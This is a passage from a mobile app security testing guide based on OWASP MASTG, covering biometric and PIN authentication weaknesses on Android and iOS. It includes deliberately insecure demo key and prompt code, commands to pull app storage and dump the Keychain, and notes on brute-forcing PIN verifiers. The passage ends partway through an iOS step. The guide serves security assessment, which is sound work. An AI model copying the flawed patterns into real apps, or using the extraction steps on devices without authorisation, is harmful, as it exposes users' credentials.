**The Keychain is the enforcement point.** `SecAccessControlCreateWithFlags(allocator, protection, flags, &error)` combines a protection class with constraints such as `.userPresence`, `.biometryAny`, `.biometryCurrentSet`, `.devicePasscode` or `.applicationPassword`. Put the result in `kSecAttrAccessControl` (it replaces `kSecAttrAccessible`; do not set both). From then on `SecItemCopyMatching` for that item causes the *system* to require the factor — showing Face ID, Touch ID or the passcode sheet, or consuming an already-authenticated `LAContext` — and returns the data only if it succeeded. A hook in the app can change what the app does with the result; it cannot make `securityd` return data it has not released. That is the "secure data retrieval path (out-of-process)" OWASP's tests refer to.

**Query attributes you will see:**

| Attribute | Purpose | Notes |
|---|---|---|
| `kSecUseAuthenticationContext` | Pass an `LAContext` to use or reuse its authentication | Preferred way to control prompt text (`context.localizedReason`) and reuse |
| `kSecUseOperationPrompt` | Prompt text for the system sheet | Deprecated since iOS 14; use `LAContext.localizedReason` |
| `kSecUseAuthenticationUI` (`kSecUseAuthenticationUIFail`, `…Skip`) | Suppress the prompt | Deprecated since iOS 14; use `LAContext.interactionNotAllowed` |
| `kSecAttrAccessControl` | The access-control object | Mutually exclusive with `kSecAttrAccessible` |

**Status codes.** `errSecSuccess` (0); `errSecUserCanceled` (-128) — the user cancelled the sheet; `errSecAuthFailed` (-25293) — authentication failed; `errSecInteractionNotAllowed` (-25308) — authentication needed but interaction was forbidden or the device is locked; `errSecItemNotFound` (-25300) — no item matches the query (check the attributes before concluding that an item is missing). The OWASP KNOW-0057 example stores its item under account "OWASP Account" and reads it back with account "My Name", which would return -25300; if you adapt it, use the same `kSecAttrAccount` in both queries, and note that it still uses the deprecated `kSecUseOperationPrompt`.

**No validity windows, with two exceptions.** The KNOW-0057 page notes that iOS has no Android-style "usable for N seconds after authentication" setting: an item with a user-presence flag requires authentication on every access. Authorisation can still be widened by reusing an evaluated `LAContext` across queries, and by `touchIDAuthenticationAllowableReuseDuration`, which lets a recent device unlock count (up to five minutes). Both are discussed in the MASWE-0016 note; for MASWE-0020, look for a context created at login and stored in a property for the session.

**`.applicationPassword` for app PINs.** This flag makes an app-supplied password part of the item's protection. The app collects the PIN in its own UI and supplies it with `LAContext.setCredential(pinData, type: .applicationPassword)`, then passes the context in `kSecUseAuthenticationContext`. A wrong PIN does not decrypt the item; the PIN is never compared in app code, and there is no stored verifier to brute-force offline. Two caveats: guesses can still be tried on the device by code running as the app, so combine it with another constraint (`[.applicationPassword, .and, .biometryCurrentSet]`, or `.devicePasscode`) so every attempt also needs an OS-throttled factor, or keep an attempt limit on the server; and the item is lost if the user forgets the PIN, so recovery must go through the server.

### Both platforms: app PINs, app locks and remember me

This section is Guler Tech material. OWASP's MASWE-0020 lists custom credentials and missing brute-force resistance as modes of introduction but has no Knowledge page or test for them; [GT-0020-2](#gt-0020-2-app-pin-and-passcode-lock-screens-android-and-ios) is the corresponding test.

Many apps add their own lock on top of, or instead of, the platform: a four- to six-digit PIN set at onboarding, a pattern, or an "app lock" that re-appears after the app has been in the background for N minutes. "Remember me" usually means the opposite: keep a long-lived session so the user does not log in again, protected (supposedly) by that lock. Five questions decide whether such a lock is a control:

1. **Where is the PIN verified?** On the server (the PIN or a value derived from it is sent and checked there, with a server-side attempt counter), or on the device. You can usually tell from the proxy: if entering a PIN produces no request, it is verified locally.
2. **What does the device store to verify it?** In order of how bad it is: the PIN in plaintext; an unsalted fast hash (`MD5`, `SHA-1`, `SHA-256`); a salted fast hash; a slow KDF (PBKDF2, scrypt, Argon2); a value that can only be checked with a non-exportable key (an HMAC under a Keystore key, or the iOS `.applicationPassword` approach). The keyspace of a numeric PIN is tiny — 10^4 for four digits, 10^6 for six — so any verifier that can be copied off the device falls to exhaustive search: hashcat tests billions of SHA-256 candidates per second on a GPU, and even PBKDF2-HMAC-SHA256 at 600,000 iterations only stretches a six-digit keyspace to minutes on a single modern GPU. **Off-device brute-force resistance for a short PIN cannot come from hashing**; it must come from a party that counts attempts and cannot be reset — the server, or secure hardware.
3. **Where is the attempt counter?** A counter in `SharedPreferences`, `UserDefaults` or a database is reset by editing the file or clearing data; an in-memory counter by restarting the app; a counter enforced only in the UI by calling the verification method directly. NIST SP 800-63B-4 requires verifiers to limit consecutive failed attempts (to no more than 100) and treats a PIN that unlocks a device-held key as an *activation secret* whose failed attempts the authenticator itself must limit. A local counter that the attacker can reset meets neither.
4. **What does "unlocked" mean in code?** A Boolean (`is_locked`, `pinVerified`), a timestamp (`last_unlock_at` compared with a timeout), or a field in a singleton. Each of them can be edited in storage or set with a hook. A correct lock has no such flag: being unlocked *is* having decrypted the session secret, and locking means discarding the plaintext.
5. **What does the lock protect?** If the refresh token or the database key is stored in plaintext (or under a key that needs no authentication) next to the PIN verifier, the PIN is irrelevant to anyone with the files: copy the token and use it from another client. This is the most valuable observation in a PIN test, because it does not depend on the PIN at all.

**Storage locations to check:**

| Platform | Location | Tooling |
|---|---|---|
| Android | `/data/data/<package>/shared_prefs/*.xml` | `adb shell su -c cat …`, or `run-as` on debuggable builds ([MASTG-TECH-0008](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0008/)) |
| Android | `/data/data/<package>/databases/*.db`, `files/`, DataStore `files/datastore/*.preferences_pb` | `sqlite3`; DataStore files are protobuf |
| iOS | `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/<bundle-id>.plist` (`UserDefaults`) | objection `ios nsuserdefaults get`; `plutil -p` on a copy ([MASTG-TECH-0059](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)) |
| iOS | Keychain | objection `ios keychain dump` ([MASTG-TECH-0061](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0061/)) |

Storing the PIN verifier in the Keychain rather than `UserDefaults` hides it from backups and casual extraction, but not from code running as the app; it does not change questions 2 to 5.

### Both platforms: what the server can know about local authentication

This section is Guler Tech material, building on the OWASP mitigation *"Enforce Authentication Server-Side"*.

The server never sees a fingerprint, a face or a device passcode. It can only see what the app sends, and it can only *trust* what the app could not have produced without the user authenticating. The options, from weakest to strongest:

| What the server receives | What it proves | Bypassable by client tampering? |
|---|---|---|
| A flag (`"biometric": true`, `X-Local-Auth: passed`) or nothing beyond the session token | Nothing | Yes — the flag is attacker-controlled |
| A session or refresh token that the app decrypted with an auth-bound key | That the token was presented; not *when* or *why* the user authenticated | Partly — an attacker who obtains the token once (or bypasses a time-bound key) can reuse it |
| A signature over a server nonce from a per-operation auth-bound key, enrolled after strong authentication | That the user authenticated on the enrolled device for *this* challenge | No, provided the key really is auth-bound — which on Android the server can verify through key attestation (`userAuthType`, `authTimeout`, `noAuthRequired` in the hardware-enforced list) |
| A passkey/WebAuthn assertion with the UV (user verified) flag set, server-checked | User verification by the platform authenticator, origin-bound, challenge-bound | No; the server must check the UV flag and the challenge |

Three details make or break the signed-challenge design, and they are what [GT-0020-3](#gt-0020-3-server-side-enforcement-of-local-authentication-android-and-ios) tests:

- **Freshness and scope.** The challenge must be server-generated, single-use and short-lived, and the signed payload must include the operation details (amount, payee, new phone number). A signature over a constant, a timestamp or a client nonce can be replayed or pre-computed during a window.
- **Mandatory, not optional.** The server must refuse the operation if the signature is missing, not fall back to the session token "for older app versions".
- **Enrolment.** Binding a new public key to an account must itself require strong authentication (step-up: password plus OTP, or an existing bound key). If an attacker with a stolen session can call the enrolment endpoint with their own key, they can sign whatever they like. OWASP tracks step-up as [MASWE-0023](/mobile/maswe-0023-step-up-authentication-not-implemented/). On Android, also verify the attestation chain at enrolment; on iOS there is no attestation of a Secure Enclave key's access control, so combine App Attest (to know the request comes from the genuine app) with code review of the key's flags.

For passkeys, the platform handles the key and the user verification; the app's job is to request `userVerification: "required"` and the server's job is to reject assertions without the UV flag. The FIDO Alliance and W3C WebAuthn Level 3 specifications define the flags.

## Tests

OWASP links five tests to MASWE-0020: three static tests for Android and a static/dynamic pair for iOS. They establish *how* the app authenticates. They do not, on their own, show what a bypass yields, and none of them covers app PIN screens or the server — so we add three supplementary tests, labelled **Guler Tech methodology**.

| Test | Platform | Type | Question it answers |
|---|---|---|---|
| [MASTG-TEST-0327](#mastg-test-0327-references-to-apis-for-event-bound-biometric-authentication-android) | Android | Static | Is `BiometricPrompt` used without a `CryptoObject`, over a key that does not require authentication? |
| [MASTG-TEST-0329](#mastg-test-0329-references-to-apis-enforcing-authentication-without-explicit-user-action-android) | Android | Static | Does a sensitive prompt disable explicit confirmation? |
| [MASTG-TEST-0330](#mastg-test-0330-references-to-apis-for-keys-used-in-biometric-authentication-with-extended-validity-duration-android) | Android | Static | Are auth-bound keys usable for a window after authentication? |
| [MASTG-TEST-0266](#mastg-test-0266-references-to-apis-for-event-bound-biometric-authentication-ios) | iOS | Static | Is `LAContext.evaluatePolicy` used without a user-presence Keychain access control? |
| [MASTG-TEST-0267](#mastg-test-0267-runtime-use-of-event-bound-biometric-authentication-ios) | iOS | Dynamic | The same, observed at runtime, with flags |
| [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) | Android | Dynamic | Does a callback bypass yield the protected secret or operation? |
| [GT-0020-2](#gt-0020-2-app-pin-and-passcode-lock-screens-android-and-ios) | Both | Static, filesystem, dynamic | Is an app PIN or app lock a real control? |
| [GT-0020-3](#gt-0020-3-server-side-enforcement-of-local-authentication-android-and-ios) | Both | Dynamic (network) | Does the server require evidence of local authentication? |

Before you start, list the operations the app protects with local authentication and rate their sensitivity: app launch, viewing balances, revealing card details or a card PIN, payments and transfers, adding a payee, changing contact details, presenting an identity credential, exporting data. Every OWASP evaluation in this area is worded "for each sensitive operation worth protecting"; the list is what turns an API observation into a finding or a non-finding.

All of the commands below use `com.example.app` (Android package) and `com.example.app` / `App` (iOS bundle ID and executable) as placeholders.

### MASTG-TEST-0327: References to APIs for Event-Bound Biometric Authentication (Android)

Source: [MASTG-TEST-0327](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0327/). Platform: Android. Type: static (code). Knowledge: [Biometric Authentication](#android-biometric-authentication-mastg-know-0001), [auth-bound Keystore keys](#android-auth-bound-keystore-keys-mastg-know-0043-mastg-know-0047-mastg-know-0012). Best practice: [MASTG-BEST-0036](#mastg-best-0036-use-cryptographic-binding-for-biometric-authentication).

#### Overview

The test looks for `BiometricPrompt.authenticate()` calls that do not pass a `CryptoObject`, and for the keys used around biometric flows that are not created with `setUserAuthenticationRequired(true)`. Without a `CryptoObject`, the only output of the prompt is the `onAuthenticationSucceeded` callback, which code running in the app can call itself. With a `CryptoObject` over a properly configured key, the sensitive result is produced inside the Keystore and depends on the authentication, out of the app's process.

#### Prerequisites

- The APK (and any split APKs) of the app. Pull it from a device with `adb shell pm path com.example.app` and `adb pull <path>`.
- [jadx](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/) to decompile ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/)), and [semgrep](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/) with the OWASP rule `mastg-android-biometric-event-bound.yml` from the `rules/` directory of the MASTG repository ([MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)).
- Your list of sensitive operations.

#### Steps

1. **Decompile.**

   ```bash
   adb shell pm path com.example.app          # note every package:/data/app/... line
   adb pull /data/app/~~xyz==/com.example.app-abc==/base.apk
   jadx -d out/ base.apk
   ```

2. **List every `authenticate` call and every `CryptoObject` construction in app code.** jadx prints nested classes with dots (`BiometricPrompt.CryptoObject`) and renders Kotlin as Java.

   ```bash
   grep -rnE '\.authenticate\(' out/sources/ | grep -vE '^out/sources/(androidx|com/google)/' > authenticate.txt
   grep -rnE 'new BiometricPrompt\.CryptoObject\(|new FingerprintManager(Compat)?\.CryptoObject\(' out/sources/ \
     | grep -vE '^out/sources/androidx/' > cryptoobject.txt
   grep -rnE 'setUserAuthenticationRequired\((true|false)\)|setUserAuthenticationParameters\(|setUserAuthenticationValidityDurationSeconds\(' \
     out/sources/ | grep -vE '^out/sources/androidx/' > keyauth.txt
   ```

   Count the arguments of each `authenticate` call: one argument (`PromptInfo`) or three (`CancellationSignal, Executor, Callback`) is event-bound; two (`PromptInfo, CryptoObject`) or four is crypto-bound. Other `authenticate` methods (OkHttp's `Authenticator`, Google Sign-In) will appear too; discard them by their class.

3. **Run the OWASP rule.**

   ```bash
   semgrep -c rules/mastg-android-biometric-event-bound.yml out/sources/ --text
   ```

   The rule has three parts: `authenticate(PromptInfo)` in files importing `androidx.biometric.BiometricPrompt`; `authenticate(CancellationSignal, Executor, Callback)` in files importing the framework class; and `new KeyGenParameterSpec.Builder(…)` without `.setUserAuthenticationRequired(true)` in the same files. Be aware of its blind spots: keys generated in a different class from the prompt (a `KeyManager` or `CryptoHelper` — very common) are not checked by the third part, and if R8 has renamed `androidx.biometric.BiometricPrompt` the `import` condition never matches. Treat the grep results from step 2 as the authoritative list.

4. **Read each callback.** For every call, open the `AuthenticationCallback` passed to it (often an anonymous class such as `LoginActivity$showBiometric$1`) and answer: does `onAuthenticationSucceeded` use `result.getCryptoObject()`? Does it call `doFinal` or `sign` on it and *use the output* (a decrypted token, a signature sent to the server)? Or does it navigate, set a flag, or read a value from storage?

5. **Trace the key for every `CryptoObject`.** Follow the `Cipher`/`Signature` back to `KeyStore.getKey(alias, null)` and the alias to its `KeyGenParameterSpec.Builder`. Record `setUserAuthenticationRequired`, the timeout and type, and whether the plaintext the cipher protects is also stored anywhere else (search the codebase for the preference key or file name of the token).

6. **If androidx is obfuscated**, start from what R8 cannot rename: `android.hardware.biometrics.BiometricPrompt`, `android.hardware.fingerprint.FingerprintManager`, `android.security.keystore.KeyGenParameterSpec`, `javax.crypto.Cipher`. The obfuscated library class that calls the framework prompt is the androidx `BiometricPrompt`; find its callers.

7. **Cross-platform frameworks.** For Flutter, the native side lives in the `io.flutter.plugins.localauth` package and the decision in Dart (`libapp.so`, see [MASTG-TECH-0156](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0156/)); `local_auth` has no `CryptoObject` support, so it is event-bound by design. For React Native, search `assets/index.android.bundle` for the biometric module's method names (`authenticateAsync`, `simplePrompt`, `createSignature`) — only signature-producing APIs can be crypto-bound.

#### Observation

A table with one row per `authenticate` call: file and line, overload (with or without `CryptoObject`), allowed authenticators, the operation it protects, what `onAuthenticationSucceeded` does, and for `CryptoObject` calls the key alias with its authentication parameters. Attach the semgrep output.

#### Evaluation

Following OWASP, the test **fails** for each sensitive operation if **both**:

- `BiometricPrompt.authenticate` is called without a `CryptoObject`; and
- no key used in conjunction with that biometric flow is generated with `setUserAuthenticationRequired(true)` — by default a Keystore key is usable whether or not the user has authenticated.

In practice, we also fail the test, citing the same weakness, when:

- a `CryptoObject` is passed but its key does not require authentication (the OWASP demo's Test 2);
- the `CryptoObject` is passed but its output is not what the app uses (it encrypts a dummy value, or ignores the result and reads the token from storage);
- the app catches `IllegalBlockSizeException`/`KeyStoreException` from `doFinal` and proceeds as if authenticated;
- the plaintext protected by the auth-bound key is also persisted elsewhere.

A prompt without `CryptoObject` *whose key does* require authentication with a timeout is not a failure of this test; it is the time-bound pattern evaluated by [MASTG-TEST-0330](#mastg-test-0330-references-to-apis-for-keys-used-in-biometric-authentication-with-extended-validity-duration-android). A prompt without `CryptoObject` over a non-sensitive feature (hiding balances on the home screen) is acceptable; record it as informational.

The test **passes** when every sensitive operation's result is produced by a `CryptoObject`-wrapped operation on a key with `setUserAuthenticationRequired(true)`, and the result is actually used. Static analysis gives you the evidence; [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) gives you the proof.

#### Demo

OWASP's [MASTG-DEMO-0090](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0090/MASTG-DEMO-0090/) uses the framework `BiometricPrompt` (API 28+). Its first scenario releases a secret token from the callback, with no `CryptoObject`:

```kotlin
val prompt1 = BiometricPrompt.Builder(context)
    .setTitle("Test 1: No CryptoObject")
    .setAllowedAuthenticators(BIOMETRIC_STRONG or DEVICE_CREDENTIAL)
    .setConfirmationRequired(false)
    .build()

prompt1.authenticate(CancellationSignal(), context.mainExecutor,
    object : BiometricPrompt.AuthenticationCallback() {
        override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
            show("Secret Token: $secretToken")       // the secret was in memory all along
        }
    })
```

Its second scenario does pass a `CryptoObject`, but the key behind it is generated like this:

```kotlin
KeyGenParameterSpec.Builder(KEY_NAME, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setUserAuthenticationRequired(false)            // the key needs no authentication
    .setInvalidatedByBiometricEnrollment(false)
    .setUserAuthenticationParameters(86400, 0)
    .setUserAuthenticationValidityDurationSeconds(86400)
    .build()
```

Running the rule against the jadx output (`MastgTest_reversed.java`) produces:

```text
┌─────────────────┐
│ 2 Code Findings │
└─────────────────┘

    ../MASTG-DEMO-0090/MastgTest_reversed.java
    ❯❱ rules.mastg-android-biometric-event-bound
          [MASVS-AUTH-2] BiometricPrompt.authenticate called without a CryptoObject or key not requiring user
          authentication. Use authenticate(PromptInfo, CryptoObject) with a keystore-backed key configured
          with setUserAuthenticationRequired(true) for sensitive operations.

           52┆ keyGenerator.init(new KeyGenParameterSpec.Builder(this.KEY_NAME, 3).setBlockModes("GCM").se
               tEncryptionPaddings("NoPadding").setUserAuthenticationRequired(false).setInvalidatedByBiome
               tricEnrollment(false).setUserAuthenticationParameters(86400,
               0).setUserAuthenticationValidityDurationSeconds(86400).build());
            ⋮┆----------------------------------------
          139┆ prompt1.authenticate(new CancellationSignal(), this$0.context.getMainExecutor(), new
               BiometricPrompt.AuthenticationCallback() { // from class:
               org.owasp.mastestapp.MastgTest$mastgTest$1$1
```

The test fails twice: line 139 is the event-bound prompt, and line 52 shows that even the `CryptoObject` scenario is unprotected, because with `setUserAuthenticationRequired(false)` the 24-hour timeout is simply ignored. The sample's own code comments call scenario 2 "SECURE"; the Keystore disagrees. In [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) the same sample yields its token in both scenarios without a biometric.

### MASTG-TEST-0329: References to APIs Enforcing Authentication without Explicit User Action (Android)

Source: [MASTG-TEST-0329](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0329/). Platform: Android. Type: static (code). Knowledge: [Biometric Authentication](#android-biometric-authentication-mastg-know-0001). Best practice: [MASTG-BEST-0038](#mastg-best-0038-require-explicit-user-confirmation-for-biometric-authentication).

#### Overview

`setConfirmationRequired(boolean)` on `BiometricPrompt.Builder` (framework, API 29+) or `BiometricPrompt.PromptInfo.Builder` (Jetpack) controls whether a passive biometric — face or iris — must be followed by an explicit tap on **Confirm**. The default is `true`. With `false`, authentication completes as soon as the sensor recognises the user, so the user can authorise an operation without meaning to: the phone is picked up to read the amount, the face is seen, the payment goes through. The authentication is genuine; what is missing is evidence of intent. This test finds prompts that disable confirmation and checks whether they protect sensitive operations.

The setting has no effect on fingerprint, which is always an explicit action, and the framework treats it as a hint: if the user has enabled "always require confirmation" in system settings, the dialog asks anyway. It matters on devices whose face authentication is Class 3 — and, for event-bound prompts that allow `BIOMETRIC_WEAK`, on many more devices.

#### Prerequisites

- jadx output as in MASTG-TEST-0327; semgrep with `mastg-android-biometric-no-confirmation-required.yml` (the rule is declared for Java only, so run it on jadx output rather than Kotlin sources).
- For the optional dynamic check: a rooted test device with Frida ([MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/)) and, ideally, a Class 3 face sensor with the system "always require confirmation" option turned off.

#### Steps

1. **Find the calls.**

   ```bash
   grep -rnE 'setConfirmationRequired\((false|true|[a-zA-Z_]+)\)' out/sources/ | grep -vE '^out/sources/androidx/'
   semgrep -c rules/mastg-android-biometric-no-confirmation-required.yml out/sources/ --text
   ```

   A non-literal argument (`setConfirmationRequired(this.requireConfirm)`) needs to be traced to its source; remote configuration flags that disable confirmation for "frictionless" journeys are worth a note in the report.

2. **Map each prompt to its operation.** For every `PromptInfo` or `Builder` with `false`, find the `authenticate` call that uses it and the operation behind it (step 4 of MASTG-TEST-0327).

3. **Optionally confirm at runtime.** On API 29+, Jetpack passes the setting through to the framework builder, so hooking the framework class catches both libraries:

   ```javascript
   // gt-confirmation.js
   Java.perform(function () {
     const Log = Java.use('android.util.Log');
     const Exc = Java.use('java.lang.Exception');
     const stack = () => Log.getStackTraceString(Exc.$new()).split('\n').slice(2, 7).join('\n');
     const B = Java.use('android.hardware.biometrics.BiometricPrompt$Builder');
     B.setConfirmationRequired.implementation = function (required) {
       console.log('[BiometricPrompt.Builder] setConfirmationRequired(' + required + ')\n' + stack());
       return this.setConfirmationRequired(required);
     };
   });
   ```

   ```bash
   frida -U -f com.example.app -l gt-confirmation.js
   ```

   Trigger each sensitive operation and, on a device with Class 3 face authentication, observe whether the dialog completes without a tap.

#### Observation

The list of `setConfirmationRequired(false)` locations, the operation each prompt protects, and optionally the runtime log and a screen recording of the prompt completing without confirmation.

#### Evaluation

The test **fails** if `setConfirmationRequired(false)` is set on a prompt that authorises a sensitive operation requiring explicit user authorisation — payments and transfers, adding payees, revealing card data or health records, signing or presenting credentials.

It **passes** if sensitive prompts use `setConfirmationRequired(true)` or leave the default. As OWASP notes, `false` is not a vulnerability in itself: for app unlock or low-risk views it is a reasonable usability choice. Note too that confirmation is about intent, not bypass resistance — an event-bound prompt with confirmation is still event-bound.

#### Demo

OWASP's [MASTG-DEMO-0092](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0092/MASTG-DEMO-0092/) reuses the MASTG-DEMO-0090 sample, whose event-bound prompt also disables confirmation (`.setConfirmationRequired(false)` in the builder shown in the previous demo). The rule finds it:

```text
┌────────────────┐
│ 1 Code Finding │
└────────────────┘

    ../MASTG-DEMO-0090/MastgTest_reversed.java
    ❯❱ rules.mastg-android-biometric-no-confirmation-required
          [MASVS-AUTH-3] BiometricPrompt allows authentication without explicit user confirmation. For
          sensitive operations, consider using setConfirmationRequired(true).

           82┆ final BiometricPrompt prompt1 = new BiometricPrompt.Builder(this.context).setTitle("Test 1:
               No CryptoObject").setSubtitle("Insecure: No cryptographic binding").setDescription("Secret
               returned directly without CryptoObject
               protection").setAllowedAuthenticators(32783).setConfirmationRequired(false).build();
```

`32783` is `0x800F`, that is `DEVICE_CREDENTIAL` (`0x8000`) | `BIOMETRIC_STRONG` (`0x000F`). The prompt releases a secret token, so the test fails. (The rule labels its message MASVS-AUTH-3 because explicit confirmation is about additional authentication for sensitive operations; OWASP maps the test itself to MASWE-0020.)

### MASTG-TEST-0330: References to APIs for Keys used in Biometric Authentication with Extended Validity Duration (Android)

Source: [MASTG-TEST-0330](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0330/). Platform: Android. Type: static (code). Knowledge: [auth-bound Keystore keys](#android-auth-bound-keystore-keys-mastg-know-0043-mastg-know-0047-mastg-know-0012). Best practice: [MASTG-BEST-0036](#mastg-best-0036-use-cryptographic-binding-for-biometric-authentication).

#### Overview

An auth-bound key can require authentication for *every* operation (timeout `0`) or be usable for *timeout* seconds after any authentication of an allowed type. In the second case, the key's protection is "someone authenticated on this phone recently", which includes simply unlocking it, and any code in the app — including a hook that fakes the app's own prompt — can use the key during the window. This test finds keys configured with a window and checks how long it is.

The relevant calls on `KeyGenParameterSpec.Builder` (and `KeyProtection.Builder` for imported keys):

| Call | Meaning |
|---|---|
| `setUserAuthenticationParameters(0, type)` (API 30+) | Per operation; use through `CryptoObject` |
| `setUserAuthenticationParameters(n, type)`, n > 0 | Usable for n seconds after authentication |
| `setUserAuthenticationValidityDurationSeconds(-1)` (deprecated in API 30) | Per operation, biometric only |
| `setUserAuthenticationValidityDurationSeconds(n)`, n > 0 (deprecated) | Usable for n seconds after biometric **or** device-credential authentication |

`type` is a bit mask of `KeyProperties.AUTH_DEVICE_CREDENTIAL` (`1`) and `KeyProperties.AUTH_BIOMETRIC_STRONG` (`2`); `3` means either. None of these has any effect unless `setUserAuthenticationRequired(true)` is also set.

#### Prerequisites

As MASTG-TEST-0327, with the rule `mastg-android-biometric-validity-duration.yml`.

#### Steps

1. **Find every validity setting and its key.**

   ```bash
   grep -rnE -B8 -A4 'setUserAuthenticationParameters\(|setUserAuthenticationValidityDurationSeconds\(' out/sources/ \
     | grep -vE '^out/sources/androidx/' > validity.txt
   semgrep -c rules/mastg-android-biometric-validity-duration.yml out/sources/ --text
   ```

   The rule compares the first argument with `> 0`, which works on jadx output because constants are inlined. If you scan Kotlin or Java sources instead, a named constant (`AUTH_WINDOW_SECONDS`) may not be resolved; grep for it.

2. **Decode each call.** Record the alias, `setUserAuthenticationRequired` (if `false` or absent, the window is irrelevant and the key fails MASTG-TEST-0327 instead), the timeout, the type, and what the key protects (trace as in MASTG-TEST-0327 step 5).

3. **Read the surrounding flow.** Time-bound keys are normally used with an event-bound prompt followed by `Cipher.init`, and with a `UserNotAuthenticatedException` handler that shows the prompt. Note the handler: some apps catch the exception and fall back to an unprotected path.

4. **Optionally confirm at runtime.** Dump the real key parameters with the `KeyGenParameterSpec` hook from our [MASWE-0016 GT-0016-2 test](/mobile/maswe-0016-key-access-not-restricted/#gt-0016-2-key-restrictions-at-creation-and-in-keyinfo-android) (`KeyInfo.getUserAuthenticationValidityDurationSeconds()` for existing keys), and measure the window with its [GT-0016-3 probe](/mobile/maswe-0016-key-access-not-restricted/#gt-0016-3-using-keystore-keys-without-authentication-android): unlock the device with the PIN, open the app, use the key without any prompt; repeat after waiting longer than the timeout. Running [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) inside and outside the window shows the same thing from the app's point of view.

#### Observation

Per key: alias, user-authentication required, timeout, authenticator types, what it protects, and (optionally) the runtime evidence that it worked without a prompt within the window.

#### Evaluation

The test **fails** if a key used for sensitive operations is configured with `setUserAuthenticationParameters(duration, type)` or `setUserAuthenticationValidityDurationSeconds(duration)` where `duration > 0`.

As with MASTG-TEST-0329, OWASP notes that a non-zero duration is not inherently a vulnerability. Our working guidance for grading:

| Window | Typical use | Assessment |
|---|---|---|
| `0` (or `-1` with the deprecated call) | Payment signing, credential presentation, revealing secrets | Expected for sensitive operations |
| A few seconds to ~30 s | Several related operations in one user action (decrypt token, then sign request) | Acceptable with a documented reason and `setUnlockedDeviceRequired(true)` |
| Minutes | "Unlock once per session" | Fails for sensitive operations; a device unlock authorises the key |
| Hours or a day (`3600`, `86400`) | Effectively "the user unlocked the phone today" | Fails; the prompt adds nothing |

Remember the side effect: keys with a window are not invalidated by new biometric enrolment, whatever `setInvalidatedByBiometricEnrollment` says (see MASWE-0022), and the deprecated call with `n > 0` also admits the device credential (see MASWE-0021).

#### Demo

OWASP's [MASTG-DEMO-0093](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0093/MASTG-DEMO-0093/) runs the validity rule over the same sample, whose key sets both a 24-hour window through the current API and the same window through the deprecated one:

```text
┌─────────────────┐
│ 2 Code Findings │
└─────────────────┘

    ../MASTG-DEMO-0090/MastgTest_reversed.java
    ❯❱ rules.mastg-android-biometric-validity-duration
          [MASVS-AUTH-2] Key configured with authentication validity duration > 0. For sensitive operations,
          use setUserAuthenticationParameters(0, type) to require authentication for every cryptographic
          operation.

           52┆ keyGenerator.init(new KeyGenParameterSpec.Builder(this.KEY_NAME, 3).setBlockModes("GCM").se
               tEncryptionPaddings("NoPadding").setUserAuthenticationRequired(false).setInvalidatedByBiome
               tricEnrollment(false).setUserAuthenticationParameters(86400,
               0).setUserAuthenticationValidityDurationSeconds(86400).build());
            ⋮┆----------------------------------------
           52┆ keyGenerator.init(new KeyGenParameterSpec.Builder(this.KEY_NAME, 3).setBlockModes("GCM").se
               ...
```

Both matches are on line 52 (the demo page's text mentions other line numbers, but the output it ships shows line 52). The test fails on the configuration: 86,400 seconds is a day. When you write it up for a real app, order the findings correctly — in this sample the window is moot, because `setUserAuthenticationRequired(false)` means the key needs no authentication at all, and the `type` argument of `0` names no authenticator. Fix the root cause (MASTG-TEST-0327) first, then the window.

### MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication (iOS)

Source: [MASTG-TEST-0266](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/). Platform: iOS. Type: static (binary). Knowledge: [Local Authentication Framework](#ios-local-authentication-framework-mastg-know-0056), [Keychain Services](#ios-keychain-services-for-local-authentication-mastg-know-0057).

#### Overview

The test checks whether the app protects sensitive resources (tokens, keys, screens backed by them) **only** with `LAContext.evaluatePolicy`, instead of storing them in the Keychain with an access control that requires user presence. `evaluatePolicy` returns a Boolean to the app; the Keychain releases data only after the system has authenticated the user. In the binary, the first shows up as a reference to the `evaluatePolicy:localizedReason:reply:` selector, the second as calls to `SecAccessControlCreateWithFlags` with a user-presence flag, followed by `SecItemAdd`/`SecItemCopyMatching`.

#### Prerequisites

- A decrypted IPA: your own build, or one extracted from a jailbroken device (App Store binaries are FairPlay-encrypted and must be decrypted first). See [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/).
- [radare2](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/) (`r2`, `rabin2`) for [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/); `otool` from the Xcode command-line tools.
- Your list of sensitive operations.

#### Steps

1. **Unpack and find the binaries.** The main executable's name is `CFBundleExecutable` in `Info.plist`. Include app extensions and embedded frameworks — biometric logic often sits in a "Core" or "Auth" framework.

   ```bash
   unzip -q app.ipa -d ipa/
